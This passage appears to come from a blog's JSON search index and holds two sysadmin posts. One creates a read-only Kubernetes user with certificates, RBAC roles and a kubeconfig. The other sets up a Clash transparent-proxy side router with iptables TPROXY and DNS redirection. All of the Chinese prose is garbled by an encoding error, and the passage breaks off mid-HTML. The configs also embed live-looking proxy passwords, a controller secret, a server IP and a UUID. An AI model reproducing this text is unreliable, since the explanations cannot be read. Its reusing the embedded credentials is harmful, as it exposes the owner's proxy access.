æœ‰ get ã€listã€watchçš„æƒé™ï¼Œä¹Ÿå°±æ˜¯è¯´role-pods_reader å¯ä»¥æŸ¥çœ‹ default ç©ºé—´çš„ pods å’Œ pods çš„æ—¥å¿—ã€‚\nä¸‰ã€åˆ›å»º Rolebinding cat \u0026lt;\u0026lt; EOF \u0026gt;\u0026gt; rolebinding.yaml apiVersion: rbac.authorization.k8s.io/v1 kind: RoleBinding metadata: name: rolebinding-default_pods_reader namespace: default roleRef: apiGroup: rbac.authorization.k8s.io kind: Role name: role-pods_reader subjects: - apiGroup: rbac.authorization.k8s.io kind: User name: reader EOF kubectl apply -f rolebinding.yaml è§£é‡Šï¼šæˆ‘ä»¬åˆ›å»ºäº†ä¸€ä¸ª rolebindingï¼Œåå­—å«åš rolebinding-default_pods_readerï¼ŒåŒæ ·æ‰€å±å‘½åç©ºé—´æ˜¯ defaultï¼Œå®ƒç»‘äº†ä¸¤ä¸ªä¸œè¥¿ï¼Œä¸€ä¸ªæ˜¯ roleï¼Œå°±æ˜¯ä¸Šé¢ç¬¬äºŒæ­¥åˆ›å»ºçš„ role-pods_readerï¼›å¦ä¸€ä¸ªæ˜¯ subjectï¼Œå¯¹åº”äº†ä¸€ä¸ªç”¨æˆ·ï¼Œå°±æ˜¯æˆ‘ä»¬ç¬¬ä¸€æ­¥åˆ›å»ºçš„é‚£ä¸ª readerã€‚\nå››ã€ç”Ÿæˆ kubectl é…ç½®æ–‡ä»¶ #!/bin/sh useraccount=reader namespace=default kubectl config set-cluster $(kubectl config view -o jsonpath=\u0026#39;{.clusters[0].name}\u0026#39;) --server=$(kubectl config view -o jsonpath=\u0026#39;{.clusters[0].cluster.server}\u0026#39;) --certificate-authority=k8s-ca.crt --embed-certs --kubeconfig=$useraccount-k8s-config kubectl config set-credentials $useraccount --client-certificate=$useraccount-k8s-access.crt --client-key=$useraccount-k8s.key --embed-certs --kubeconfig=$useraccount-k8s-config kubectl config set-context $useraccount --cluster=$(kubectl config view -o jsonpath=\u0026#39;{.clusters[0].name}\u0026#39;) --namespace=$namespace --user=$useraccount --kubeconfig=$useraccount-k8s-config kubectl config use-context $useraccount --kubeconfig=$useraccount-k8s-config è§£é‡Šï¼šä¸Šé¢çœ‹èµ·æ¥å¾ˆå¤æ‚ï¼Œå…¶å®å°±æ˜¯å››æ­¥ï¼Œåœ¨é…ç½®æ–‡ä»¶é‡Œè®¾ç½® cluster ã€è®¾ç½® credentials è¯ä¹¦ã€è®¾ç½® context ä¸Šä¸‹æ–‡ã€è®¾ç½®å½“å‰ä¸Šä¸‹æ–‡ã€‚\nå®Œäº‹åä¼šäº§ç”Ÿä¸€ä¸ªå®Œæ•´çš„ reader-k8s-config æ–‡ä»¶ï¼Œå¦‚ä¸‹ï¼š\näº”ã€æµ‹è¯• æˆ‘ä»¬éªŒè¯ä¸€ä¸‹ï¼š\nKUBECONFIG=reader-k8s-config kubectl get pods KUBECONFIG=reader-k8s-config kubectl auth can-i delete pods KUBECONFIG=reader-k8s-config kubectl auth can-i delete svc è¿™æ ·ä¸€ä¸ªå¯¹ default ç©ºé—´çš„åªè¯»ç”¨æˆ·å°±å»ºç«‹å¥½äº†\nå…­ã€é›†ç¾¤åªè¯»ç”¨æˆ· æˆ‘ä»¬è¿™é‡Œç»™å‡ºé›†ç¾¤åªè¯»ç”¨æˆ·çš„ roleï¼Œå‘½å role-cluster_reader\nkubectl apply -f - \u0026lt;\u0026lt;EOF apiVersion: rbac.authorization.k8s.io/v1 kind: ClusterRole metadata: name: role-cluster_reader rules: - apiGroups: - \u0026#34;\u0026#34; resources: - nodes - pods - pods/exec - pods/log - services - configmaps - secrets - serviceaccounts - endpoints verbs: - get - list - watch - apiGroups: - apps resources: - deployments - replicasets - daemonsets - statefulsets verbs: - get - list - watch - apiGroups: - batch resources: - jobs - cronjobs verbs: - get - list - watch EOF ä»¥åŠ rolebindingï¼Œè¿˜æ˜¯ç»‘åˆ°ç¬¬ä¸€æ­¥çš„ç”¨æˆ· reader çš„ä¾‹å­\nkubectl apply -f - \u0026lt;\u0026lt;EOF apiVersion: rbac.authorization.k8s.io/v1 kind: ClusterRoleBinding metadata: name: rolebinding-cluster_reader roleRef: apiGroup: rbac.authorization.k8s.io kind: ClusterRole name: role-cluster_reader subjects: - apiGroup: rbac.authorization.k8s.io kind: User name: reader EOF ç”Ÿæˆé…ç½®æ–‡ä»¶çš„æ­¥éª¤è·Ÿä¸Šä¸€æ­¥æ˜¯ä¸€æ ·çš„ã€‚\nä»ä¸Šé¢å¤§å®¶å¯ä»¥çœ‹åˆ°ï¼Œå…¶å®æœ€ä¸»è¦çš„å°±æ˜¯ role çš„ yaml æ–‡ä»¶ï¼Œé‡Œé¢æ§åˆ¶ç€åˆ°åº•æœ‰æ€ä¹ˆæ ·çš„æƒé™ã€‚\n","permalink":"https://rendoumi.com/posts/20211109-k8s_rbac/","summary":"\u003cp\u003ekubernetes è£…å¥½æ­£å¸¸è¿è¡Œä¸€æ®µæ—¶é—´åï¼Œä¼šå‡ºç°è¦æŠŠç ”å‘å’Œè¿ç»´æƒé™åˆ†å¼€çš„åœºæ™¯ï¼š\u003c/p\u003e\n\u003cp\u003eæ¯”å¦‚ï¼š\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eç»™æŸä¸ªç”¨æˆ·æŸä¸€æŒ‡å®šåç§°ç©ºé—´ä¸‹çš„ç®¡ç†æƒé™\u003c/li\u003e\n\u003cli\u003eç»™ç”¨æˆ·èµ‹äºˆé›†ç¾¤çš„åªè¯»æƒé™\u003c/li\u003e\n\u003cli\u003eâ€¦\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eéå¸¸éº»çƒ¦ï¼Œæˆ‘ä»¬è¿™é‡Œä¸è®¨è®ºè¿‡å¤šçš„æ¦‚å¿µï¼Œä»è¿ç»´çš„è§’åº¦å‡ºå‘ï¼Œç®€å•å®ç”¨åŒ–\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eæˆ‘ä»¬éœ€è¦æ˜ç¡®ä¸‰ä¸ªRBACæœ€åŸºæœ¬çš„æ¦‚å¿µ\u003c/strong\u003e\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eRole: è§’è‰²ï¼Œå®ƒå®šä¹‰äº†ä¸€ç»„è§„åˆ™ï¼Œå®šä¹‰äº†ä¸€ç»„å¯¹Kubernetes APIå¯¹è±¡çš„æ“ä½œæƒé™\u003c/li\u003e\n\u003cli\u003eRoleBinding: å®šä¹‰äº†\u0026quot;è¢«ä½œç”¨è€…\u0026quot;å’Œ\u0026quot;è§’è‰²\u0026quot;çš„ç»‘å®šå…³ç³»\u003c/li\u003e\n\u003cli\u003eSubject: è¢«ä½œç”¨è€…ï¼Œæ—¢å¯ä»¥æ˜¯\u0026quot;äºº\u0026quot;ï¼Œä¹Ÿå¯ä»¥æ˜¯æœºå™¨ï¼Œå½“ç„¶ä¹Ÿå¯ä»¥æ˜¯ Kubernetes ä¸­å®šä¹‰çš„ç”¨æˆ·(ServiceAccountä¸»è¦è´Ÿè´£kuberneteså†…ç½®ç”¨æˆ·)\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eæˆ‘ä»¬çš„æ“ä½œè¿‡ç¨‹æµç¨‹å¦‚ä¸‹ï¼Œé¦–å…ˆåˆ›å»ºå®¢æˆ·ç«¯è¯ä¹¦ï¼›å…¶æ¬¡åˆ›å»ºRoleè§’è‰²ï¼›å†åˆ›å»ºRoleBindingï¼ŒæŠŠSubjectå’ŒRoleç»‘å®šï¼Œå°±å®Œäº‹äº†ï¼›æœ€åä¸€æ­¥æ˜¯ç”Ÿæˆ kubectl çš„é…ç½®æ–‡ä»¶ã€‚\u003c/p\u003e\n\u003ch2 id=\"ä¸€åˆ›å»ºå®¢æˆ·ç«¯è¯ä¹¦\"\u003eä¸€ã€åˆ›å»ºå®¢æˆ·ç«¯è¯ä¹¦\u003c/h2\u003e\n\u003cp\u003e\u003cstrong\u003eæˆ‘ä»¬ä»¥å·²å»ºå¥½çš„é˜¿é‡Œ ACK ä¸ºä¾‹ï¼Œæˆ–è€…è‡ªå»ºå¥½çš„ Kubernetes ä¹Ÿè¡Œï¼›ç¡®å®šå·²ç»æœ‰äº† .kube/config é…ç½®æ–‡ä»¶ï¼Œæ‹¥æœ‰é›†ç¾¤æœ€é«˜æƒé™ï¼Œå¹¶ä¸”å¯ä»¥æ­£å¸¸æ‰§è¡Œ kubectl å‘½ä»¤ã€‚\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003eé¦–å…ˆæ˜¯ç”Ÿæˆè¯ä¹¦ï¼Œå¹¶å‘é›†ç¾¤æå‡ºè¯ä¹¦è¯·æ±‚å¹¶ç­¾å‘ï¼Œè„šæœ¬å¦‚ä¸‹ï¼š\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cp\"\u003e#!/bin/sh  \n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cp\"\u003e\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003euseraccount\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003ereader\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eopenssl req -new -newkey rsa:4096 -nodes -keyout \u003cspan class=\"nv\"\u003e$useraccount\u003c/span\u003e-k8s.key -out \u003cspan class=\"nv\"\u003e$useraccount\u003c/span\u003e-k8s.csr -subj \u003cspan class=\"s2\"\u003e\u0026#34;/CN=\u003c/span\u003e\u003cspan class=\"nv\"\u003e$useraccount\u003c/span\u003e\u003cspan class=\"s2\"\u003e/O=devops\u0026#34;\u003c/span\u003e  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003ecsr\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"k\"\u003e$(\u003c/span\u003ecat \u003cspan class=\"nv\"\u003e$useraccount\u003c/span\u003e-k8s.csr \u003cspan class=\"p\"\u003e|\u003c/span\u003e base64 \u003cspan class=\"p\"\u003e|\u003c/span\u003e tr -d \u003cspan class=\"s1\"\u003e\u0026#39;\\n\u0026#39;\u003c/span\u003e\u003cspan class=\"k\"\u003e)\u003c/span\u003e  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ecat \u003cspan class=\"s\"\u003e\u0026lt;\u0026lt; EOF \u0026gt; k8s-csr.yaml  \n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003eapiVersion: certificates.k8s.io/v1beta1\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003ekind: CertificateSigningRequest\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003emetadata:\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e  name: $useraccount-k8s-access\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003espec:\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e  groups:\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e  - system:authenticated\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e  request: $csr\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e  usages:\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e  - client auth\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003eEOF\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ekubectl create -f k8s-csr.yaml  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ekubectl certificate approve \u003cspan class=\"nv\"\u003e$useraccount\u003c/span\u003e-k8s-access  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ekubectl get csr \u003cspan class=\"nv\"\u003e$useraccount\u003c/span\u003e-k8s-access -o \u003cspan class=\"nv\"\u003ejsonpath\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;{.status.certificate}\u0026#39;\u003c/span\u003e \u003cspan class=\"p\"\u003e|\u003c/span\u003e base64 --decode \u0026gt; \u003cspan class=\"nv\"\u003e$useraccount\u003c/span\u003e-k8s-access.crt  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ekubectl config view -o \u003cspan class=\"nv\"\u003ejsonpath\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;{.clusters[0].cluster.certificate-authority-data}\u0026#39;\u003c/span\u003e --raw \u003cspan class=\"p\"\u003e|\u003c/span\u003e base64 --decode - \u0026gt; k8s-ca.crt\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eè§£é‡Šä¸€ä¸‹ï¼šæˆ‘ä»¬å®šä¹‰äº†ä¸€ä¸ªç”¨æˆ·CN=readerï¼Œç„¶åå‘é›†ç¾¤å‘é€äº†è¯ä¹¦è¯·æ±‚å¹¶ç­¾å‘ï¼Œæœ€ç»ˆä»é›†ç¾¤è·å¾—äº† reader-k8s-access.crt çš„å®¢æˆ·ç«¯è¯ä¹¦å’Œ k8s-ca.crt çš„ CA è¯ä¹¦ã€‚\u003c/p\u003e","title":"Kubernetesåˆ›å»ºæ™®é€šè´¦å·"},{"content":"æ²¡å•ŠåŠæ³•ï¼Œç¿»å¢™ç¿»å¢™è¿˜æ˜¯ç¿»å¢™ã€‚\nä¸Šæ¸¸æœ‰è‹¥å¹² trojian ã€v2ray ã€sock5 ã€httpå„ç§å„æ ·çš„ä»£ç†ï¼Œè¿™æ ·å¤šç§çš„é€‰æ‹©ï¼Œé‚£ä¹ˆå°±è£…ä¸€ä¸ª clash å®¢æˆ·ç«¯å°±å¯ä»¥å…¨æ¥ç®¡äº†ã€‚\nè¯´ä¸‹æˆ‘ä»¬çš„åšæ³•ï¼šæ‰¾ä¸ªå°Linuxåšæ—è·¯ç”±ï¼ŒDNSå’Œç½‘å…³éƒ½è®¾ç½®åœ¨è¿™å°æœºå™¨ä¸Šï¼Œå±€åŸŸç½‘å†…çš„æœºå™¨éƒ½é€šè¿‡è¿™å°ä¸Šç½‘ã€‚\næˆ‘ä»¬ç”¨åˆ°çš„æ˜¯ clash çš„ Tproxy redir-host å’Œ udp-proxy æ¨¡å¼ï¼Œè¿™ç§æ¨¡å¼æ¯”è¾ƒå¼ºå¤§ã€‚ç”¨å°±ç”¨æœ€å¼ºå¤§çš„ã€‚\nå®‰è£…å¾ˆç®€å•ï¼Œæ“ä½œç³»ç»Ÿ centos æˆ–è€… ubuntu éƒ½è¡Œï¼Œé¡¹ç›®åœ°å€ï¼š\nhttps://github.com/Dreamacro/clash\nè¯´æ˜ä¹¦ï¼š\nhttps://lancellc.gitbook.io/clash/clash-config-file/proxy-groups/load-balance\né¦–å…ˆä¸‹è½½äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œç°åœ¨ç‰ˆæœ¬æ˜¯ v1.7.1ï¼Œè§£å‹åæ”¾åˆ° /usr/local/bin ç›®å½•ä¸‹\nwget https://github.com/Dreamacro/clash/releases/download/v1.7.1/clash-linux-amd64-v1.7.1.gz gzip -d clash-linux-amd64-v1.7.1.gz chmod 755 clash-linux-amd64-v1.7.1 mv clash-linux-amd64-v1.7.1 /usr/local/bin ç„¶åç”Ÿæˆ clash.service\ncat \u0026lt;\u0026lt; EOF \u0026gt;\u0026gt; /etc/systemd/system/clash.service [Unit] Description=clash service After=network.target [Service] Type=simple User=root ExecStart=/usr/local/bin/clash-linux-amd64-v1.7.1 Restart=on-failure # or always, on-abort, etc [Install] WantedBy=multi-user.target EOF ç„¶åæœ€é‡è¦çš„ï¼Œå°±æ˜¯é…ç½®æ–‡ä»¶äº†\næˆ‘è¿™é‡Œè¿™ä¸ªæ—è·¯ç”±çš„è®¾å¤‡ IP åœ°å€æ˜¯ 192.168.2.2ï¼Œç½‘å¡è®¾å¤‡æ˜¯ enp2s0\nä¸‹å–å¼„\n# httpçš„ä»£ç†ç«¯å£ port: 7890 #mixed-port: 7890 socks-port: 7891 redir-port: 7892 tproxy-port: 7893 ipv6: false allow-lan: true bind-address: \u0026#39;192.168.2.2\u0026#39; interface-name: enp2s0 mode: rule log-level: info external-controller: 0.0.0.0:9090 secret: \u0026#34;Fuck2021\u0026#34; external-ui: dashboard profile: store-selected: false tracing: true hosts: # æŠŠcantvçš„åŸŸåè§£æå±è”½æ‰ï¼Œç¦æ­¢å®ƒè‡ªåŠ¨å‡çº§ \u0026#39;tms.can.cibntv.net\u0026#39;: 0.0.0.0 dns: enable: true listen: 0.0.0.0:1053 enhanced-mode: redir-host # or fake-ip nameserver: - \u0026#39;114.114.114.114\u0026#39; - \u0026#39;223.5.5.5\u0026#39; fallback: - 208.67.220.220:5353 - 208.67.222.222:5353 - 101.6.6.6:5353 proxies: - name: \u0026#34;trojan1\u0026#34; type: trojan server: www.linuxboy.net port: 443 password: Fuck2021 sni: www.linuxboy.net skip-cert-verify: true - name: \u0026#34;vmess1\u0026#34; type: vmess server: 101.59.201.93 port: 41555 uuid: 7a17ae5e-fb86-42e2-abd4-b8c33cfabcd alterId: 64 cipher: auto proxy-groups: - name: Proxy type: select proxies: - trojan - name: \u0026#34;auto\u0026#34; type: url-test proxies: - vmess1 - trojan1 url: \u0026#39;http://www.gstatic.com/generate_204\u0026#39; interval: 300 rules: - DOMAIN-SUFFIX,v2ex.com,Proxy - DOMAIN-SUFFIX,t66y.com,Proxy - DOMAIN-SUFFIX,ycombinator.com,Proxy - DOMAIN-SUFFIX,reddit.com,Proxy - DOMAIN-KEYWORD,amazon,Proxy - DOMAIN-KEYWORD,google,Proxy - DOMAIN-KEYWORD,gmail,Proxy - DOMAIN-KEYWORD,youtube,Proxy - DOMAIN-KEYWORD,facebook,Proxy - DOMAIN-SUFFIX,fb.me,Proxy - DOMAIN-SUFFIX,fbcdn.net,Proxy - DOMAIN-KEYWORD,twitter,Proxy - DOMAIN-KEYWORD,instagram,Proxy - DOMAIN-KEYWORD,dropbox,Proxy - DOMAIN-SUFFIX,twimg.com,Proxy - DOMAIN-KEYWORD,blogspot,Proxy - DOMAIN-SUFFIX,youtu.be,Proxy - DOMAIN-KEYWORD,whatsapp,Proxy - SRC-IP-CIDR,192.168.1.0/32,DIRECT - SRC-IP-CIDR,192.168.2.0/32,DIRECT - IP-CIDR,127.0.0.0/8,DIRECT - GEOIP,CN,DIRECT - MATCH,Proxy è§£é‡Šä¸€ä¸‹ï¼šproxy å®šä¹‰äº†ä¸¤ä¸ªä»£ç†ï¼Œä¸€ä¸ªæ˜¯ trojanï¼Œä¸€ä¸ªæ˜¯ v2rayã€‚ç„¶åå†é›†åˆæˆç»„ï¼Œä¸€ä¸ªç»„å« Proxyï¼Œ æ˜¾å¼æŒ‡å®šç”¨ trojanï¼›å¦ä¸€ä¸ªç»„å« autoï¼Œæ ¹æ® vmess1 å’Œ trojan1 è®¿é—® http://www.gstatic.com/generate_204 çš„é¡µé¢é€Ÿåº¦ï¼Œè°å¿«å°±ç”¨è°ï¼Œç¼ºçœ300ç§’ä¼šè®¿é—®ä¸€æ¬¡è¿™ä¸ªé¡µé¢æ¥å†³å®šå“ªä¸ªä»£ç†å¿«ã€‚\nå‰©ä¸‹çš„ rules å°±å¾ˆç®€å•ï¼ŒæŠŠè‡ªå·±çŸ¥é“è¦è®¿é—®çš„åŸŸåæ”¾åˆ°ä»£ç†ä¸­å»ï¼Œç„¶åæŠŠå±€åŸŸç½‘çš„ IP æ®µæ”¾è¿› DIRECT ç›´æ¥è®¿é—®ï¼Œæœ€å GEO IP ä¸æ˜¯ä¸­å›½çš„ç”± Proxy å…œåº•ã€‚\nç½‘ä¸Šæœ‰ä¸€å¤§å †è§„åˆ™ï¼Œå…«æˆ’çš„å»ºè®®æ˜¯ä¸è¦å»å­¦ï¼Œè§„åˆ™è¶Šå¤šè¶Šæ…¢ï¼Œä½ è‡ªå·±çŸ¥é“è¦è®¿é—®ä»€ä¹ˆç½‘ç«™éœ€è¦ç¿»å¢™ï¼ŒåŠ è¿›å»å°±å¥½äº†ã€‚å¼„ä¸€å †ï¼Œè‡ªå·±çœ‹ç€éƒ½å¤´è’™\næœ€åæˆ‘ä»¬åœ¨ rc.local æ”¾å…¥ä»¥ä¸‹ iptable å†…å®¹ï¼Œå°±å¯ä»¥äº†\n### #clash ip rule add fwmark 1 table 100 ip route add local 0.0.0.0/0 dev lo table 100 # CREATE TABLE iptables -t mangle -N clash # RETURN LOCAL AND LANS iptables -t mangle -A clash -d 0.0.0.0/8 -j RETURN iptables -t mangle -A clash -d 10.0.0.0/8 -j RETURN iptables -t mangle -A clash -d 100.64.0.0/10 -j RETURN iptables -t mangle -A clash -d 127.0.0.0/8 -j RETURN iptables -t mangle -A clash -d 169.254.0.0/16 -j RETURN iptables -t mangle -A clash -d 172.16.0.0/12 -j RETURN iptables -t mangle -A clash -d 192.168.0.0/16 -j RETURN iptables -t mangle -A clash -d 224.0.0.0/4 -j RETURN iptables -t mangle -A clash -d 240.0.0.0/4 -j RETURN # whitelist China ip. # iptables -t mangle -A clash -m set --match-set china dst -j RETURN # FORWARD ALL iptables -t mangle -A clash -p udp -j TPROXY --on-port 7893 --tproxy-mark 1 iptables -t mangle -A clash -p tcp -j TPROXY --on-port 7893 --tproxy-mark 1 # REDIRECT iptables -t mangle -A PREROUTING -j clash # hijack DNS to Clash iptables -t nat -N CLASH_DNS iptables -t nat -F CLASH_DNS iptables -t nat -A CLASH_DNS -p udp -j REDIRECT --to-port 1053 iptables -t nat -I PREROUTING -p udp --dport 53 -j CLASH_DNS æœ€åå¯åŠ¨clash\nsystemctl start clash ","permalink":"https://rendoumi.com/posts/20211108-clash/","summary":"\u003cp\u003eæ²¡å•ŠåŠæ³•ï¼Œç¿»å¢™ç¿»å¢™è¿˜æ˜¯ç¿»å¢™ã€‚\u003c/p\u003e\n\u003cp\u003eä¸Šæ¸¸æœ‰è‹¥å¹² trojian ã€v2ray ã€sock5 ã€httpå„ç§å„æ ·çš„ä»£ç†ï¼Œè¿™æ ·å¤šç§çš„é€‰æ‹©ï¼Œé‚£ä¹ˆå°±è£…ä¸€ä¸ª clash å®¢æˆ·ç«¯å°±å¯ä»¥å…¨æ¥ç®¡äº†ã€‚\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eè¯´ä¸‹æˆ‘ä»¬çš„åšæ³•ï¼šæ‰¾ä¸ªå°Linuxåšæ—è·¯ç”±ï¼ŒDNSå’Œç½‘å…³éƒ½è®¾ç½®åœ¨è¿™å°æœºå™¨ä¸Šï¼Œå±€åŸŸç½‘å†…çš„æœºå™¨éƒ½é€šè¿‡è¿™å°ä¸Šç½‘ã€‚\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eæˆ‘ä»¬ç”¨åˆ°çš„æ˜¯ clash çš„ Tproxy redir-host å’Œ udp-proxy æ¨¡å¼ï¼Œè¿™ç§æ¨¡å¼æ¯”è¾ƒå¼ºå¤§ã€‚ç”¨å°±ç”¨æœ€å¼ºå¤§çš„ã€‚\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003eå®‰è£…å¾ˆç®€å•ï¼Œæ“ä½œç³»ç»Ÿ centos æˆ–è€… ubuntu éƒ½è¡Œï¼Œé¡¹ç›®åœ°å€ï¼š\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://github.com/Dreamacro/clash\"\u003ehttps://github.com/Dreamacro/clash\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003eè¯´æ˜ä¹¦ï¼š\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://lancellc.gitbook.io/clash/clash-config-file/proxy-groups/load-balance\"\u003ehttps://lancellc.gitbook.io/clash/clash-config-file/proxy-groups/load-balance\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003eé¦–å…ˆä¸‹è½½äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œç°åœ¨ç‰ˆæœ¬æ˜¯ v1.7.1ï¼Œè§£å‹åæ”¾åˆ° /usr/local/bin ç›®å½•ä¸‹\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ewget https://github.com/Dreamacro/clash/releases/download/v1.7.1/clash-linux-amd64-v1.7.1.gz\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003egzip -d clash-linux-amd64-v1.7.1.gz\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003echmod \u003cspan class=\"m\"\u003e755\u003c/span\u003e clash-linux-amd64-v1.7.1\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003emv clash-linux-amd64-v1.7.1 /usr/local/bin\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eç„¶åç”Ÿæˆ clash.service\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ecat \u003cspan class=\"s\"\u003e\u0026lt;\u0026lt; EOF \u0026gt;\u0026gt; /etc/systemd/system/clash.service \n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e[Unit]\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003eDescription=clash service\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003eAfter=network.target\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e[Service]\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003eType=simple\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003eUser=root\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003eExecStart=/usr/local/bin/clash-linux-amd64-v1.7.1\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003eRestart=on-failure # or always, on-abort, etc\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan 